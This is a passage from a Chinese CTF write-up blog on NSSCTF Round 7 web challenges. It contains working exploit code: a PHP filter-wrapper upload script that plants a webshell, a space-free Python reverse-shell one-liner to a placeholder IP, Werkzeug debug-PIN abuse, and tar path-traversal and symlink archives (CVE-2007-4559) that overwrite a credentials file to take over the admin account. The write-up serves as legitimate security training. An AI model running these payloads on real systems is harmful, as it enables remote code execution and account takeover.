class="line"></span><br><span class="line">    payload = <span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">b64encode</span>(b<span class="string">&quot;&lt;?php system(&#x27;find / -name f1ag&#x27;);?&gt;&quot;</span>)) <span class="comment">#修改为自己想要执行的命令</span></span><br><span class="line">    payload = re.<span class="title function_ invoke__">findall</span>(r<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,payload)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    file = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%31%2e%70%6e%67%2e%70%68%70&#x27;</span>, f<span class="string">&quot;aaa&#123;payload&#125;&quot;</span>)&#125;</span><br><span class="line">    </span><br><span class="line">    requests.<span class="title function_ invoke__">post</span>(url,files=file,data=data).text</span><br><span class="line">    </span><br><span class="line">    response = requests.<span class="title function_ invoke__">get</span>(f<span class="string">&#x27;&#123;URL&#125;/1.png.php&#x27;</span>).text</span><br><span class="line">    <span class="keyword">print</span>(response)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="title function_ invoke__">getflag</span>(<span class="string">&quot;http://node5.anna.nssctf.cn:28372&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>flag在&#x2F;home&#x2F;f1ag下（注意是数字1不是字母l），找这个flag也是够折磨的。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-0o0-flag.PNG"></p><h2 id="Shadowflag"><a href="#Shadowflag" class="headerlink" title="Shadowflag"></a>Shadowflag</h2><p>和round6里面的一题很像，都是flask框架，反弹shell并且要算pin码。<br>源码：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line">tag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">global</span> tag</span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">global</span> flag1</span><br><span class="line">        <span class="keyword">del</span> flag1</span><br><span class="line">        tag = <span class="literal">True</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)</span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.system(action)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;扫扫扫，扫啥东方明珠呢[怒]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>可以看到<code>os.system(&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;)</code>，题目删除了这两个flag文件</li><li><code>flag1 = open(&quot;/tmp/flag1.txt&quot;, &quot;r&quot;)</code>，环境已经打开了flag1.txt并且还没有关闭，所以此时再删除，进程也不会结束，还可以在&#x2F;proc&#x2F;[pid]&#x2F;fd中查看内容。</li><li><code>with open(&quot;/tmp/flag2.txt&quot;, &quot;r&quot;) as f:flag2 = f.read()</code>，with open会在打开文件后自动关闭，但是这里环境中已经有了flag2变量，可以在环境中查看。</li></ul><hr><p>我们要利用os.system()来反弹shell，不会写payload但是这里有大佬总结的反弹shell代码：<br>[]<a class="link" target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>python环境下无空格的反弹shell代码如下：<br><code>python%09-c%09&#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;xx.xx.xx.x&quot;,2333));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39;</code><br>%09可以替换为$IFS，因为$IFS是在代码执行时才转换为空格。但是我实际用python发包的时候并不能反弹shell，尝试了很多payload都不行，最后只能用hackbar发包试试，结果同样的payload就反弹成功了，可能是编码的问题。</p><p>总之反弹成功后在&#x2F;proc&#x2F;17&#x2F;fd下看到了flag1<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-shadowflag-flag1.PNG"><br>然后是计算pin码，这部分在nssround6里面的check那题里面做过了，这里不再赘述。只是说一下用户名可以用<code>whoami</code>看一下，这里不需要root权限。<code>app.py</code>的位置可以在&#x2F;shell中传一个不为act的参数来通过报错看到。这里是docker机所以看的是boot_id<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-shadowflag-pin.PNG"><br>计算出pin码后通过&#x2F;console登录，发现输入flag2或者dump()没用，后来发现需要在&#x2F;home&#x2F;ctf&#x2F;app.py环境下。在&#x2F;shell下随便post一个不为act的参数导致报错，能够看到&#x2F;home&#x2F;ctf&#x2F;app.py环境，在这里输入flag2或dump()得到flag2。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-shadowflag-flag2.PNG"></p><h2 id="新的博客"><a href="#新的博客" class="headerlink" title="新的博客"></a>新的博客</h2><p>还是和前面差不多的题，利用了cve-2007-4559，老实说我感觉这已经不能被称之为漏洞了，可能这就是当初设计的初衷。<br>先进第一篇文章看看。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-hint.PNG"><br>明显要我们解码<code>NGQ2ZDU5MzM0ZDdhNjMzMDRlNmE0NTMzNGU0NDU5MzU0ZTZhNGQ3OTVhNmE2MzMzNGU3YTYz MzM0ZTdhNGE2YzRlN2E1MTMyNGQ1NDYzNzk0ZDZkNTUzMjRlN2E2NDY4</code>来拿到信息。两次base64+hex解码。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-%E8%A7%A3%E7%A0%81.PNG"><br>访问&#x2F;static&#x2F;<a class="link" target="_blank" rel="noopener" href="http://www.tar.gz,下载后打开./">www.tar.gz，下载后打开。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>主目录app下有conf和userdata，conf下的userinfo.json应该是用来存储用户名和密码的，userdata下存放了每个用户。文件结构图示如下：<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-structure.png"><br>还需要创建一个用户来获得更多信息，随便创建一个用户登录。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-web.PNG"><br>到&#x2F;blog&#x2F;backup下会给你一个[username].tar.gz，打开后是[username]-&gt;flag的结构，这说明所有用户都保存在userdata目录下。</p><p>这里有两种解法</p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>利用文件覆盖的漏洞，把userinfo.json给覆盖掉，admin用户的密码可以自己设定，这样就能登录admin用户了。<br>先构造userinfo.json</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;userinfo.json&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(password.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></div><p>我把密码设置为1234<br>然后构造tar.gz文件就ok了</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">tf</span>):</span><br><span class="line">    tf.name=<span class="string">&quot;../conf/userinfo.json&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tf</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&#x27;exp.tar.gz&#x27;</span>,<span class="string">&#x27;w:gz&#x27;</span>) <span class="keyword">as</span> tf:</span><br><span class="line"> tf.add(<span class="string">&#x27;userinfo.json&#x27;</span>,<span class="built_in">filter</span>=changename)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>可以看到我把文件名修改为了<code>../conf/userinfo.json</code>，这就是说当前目录是userdata，这个是我从网上看到的，至于为什么当前目录是userdata，可能是因为&#x2F;blog&#x2F;backup时返回的文件暗示了工作目录是userdata，而&#x2F;blog&#x2F;recover和它应该是同一个工作目录，所以解压tar包时的当前目录就是userdata?<br>总而言之，把构造完的exp.tar.gz上传就可以登录admin了，密码就是1234。登陆后点击第二篇文章，看到flag。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-flag.PNG"></p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>这个非预期我觉得和预期解原理是一样的，都是覆盖文件，只是利用方式不一样。非预期是用软链接覆盖&#x2F;[username]&#x2F;flag文件，软链接通向<code>/app/conf/userinfo.json</code>，然后再构造&#x2F;[username]&#x2F;flag文件内容为修改后的userinfo.json，这样就通过软链接把我们构造的账号密码传到了userinfo.json中，实现修改admin账户密码。<br>命令如下</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /app/conf/userinfo.json abc/flag</span><br><span class="line">tar -cvzf upload1.tar.gz abc/  <span class="comment">#软链接</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unlink</span> abc/flag</span><br><span class="line"><span class="built_in">touch</span> abc/flag</span><br><span class="line">vim abc/flag <span class="comment">#把恶意的userinfo.json复制进去</span></span><br><span class="line"><span class="built_in">cat</span> abc/flag <span class="comment">#检查一下</span></span><br><span class="line">tar -cvzf upload2.tar.gz abc/  <span class="comment">#修改密码</span></span><br></pre></td></tr></table></figure></div><p>然后分别把两个.tar.gz上传进去就ok了。登录admin，拿到flag。</p></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul><li><strong>Title:</strong> nssctf round7</li><li><strong>Author:</strong> Sh7err</li><li><strong>Created at :</strong> 2023-09-11 21:24:07</li><li><strong>Updated at :</strong> 2023-09-16 21:54:18</li><li><strong>Link:</strong> https://xzzz111.github.io/2023/09/11/nssctf-round7/</li><li><strong>License: </strong>This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.</li></ul></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/ctf/">#ctf</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2023/09/17/nssctf-round8/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item">nssctf-round8_web</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2023/09/08/nssctf-round6/"><span class="title flex justify-center items-center"><span class="post-nav-title-item">nssctf round6</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">On this page</div><div class="page-title">nssctf round7</div><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#nssround7-web"><span class="nav-text">nssround7_web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-RCE"><span class="nav-text">ez_RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o0"><span class="nav-text">0o0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shadowflag"><span class="nav-text">Shadowflag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2"><span class="nav-text">新的博客</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-text">预期解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-text">非预期</span></a></li></ol></li></ol></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="customize-info my-1">你不认识我吗？</div><div class="text-center">&copy; <span>2023</span> - 2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">Sh7err</a></div><script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">VISITOR COUNT</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">TOTAL PAGE VIEWS</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span> <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.4.4</a></span></div><div>Blog up for <span class="odometer" id="runtime_days"></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-expand-width flex justify-center items-center"><i class="fa-regular fa-expand"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div></main><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/libs/Swup.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/libs/SwupSlideTheme.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/libs/SwupScriptsPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/libs/SwupProgressPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/libs/SwupScrollPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"})],containers:["#swup"]});swup.hooks.on("page:view",()=>{Global.refresh()})</script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/utils.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/main.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/layouts/navbarShrink.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/tools/scrollTopBottom.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/tools/lightDarkSwitch.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/layouts/categoryList.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/tools/codeBlock.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/layouts/lazyload.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/tools/runtime.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/libs/odometer.min.js"></script><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/assets/odometer-theme-minimal.css"><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/libs/Typed.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/plugins/typed.js"></script><div class="post-scripts" data-swup-reload-script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/libs/anime.min.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/tools/tocToggle.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/layouts/toc.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/js/plugins/tabs.js"></script></div></body></html>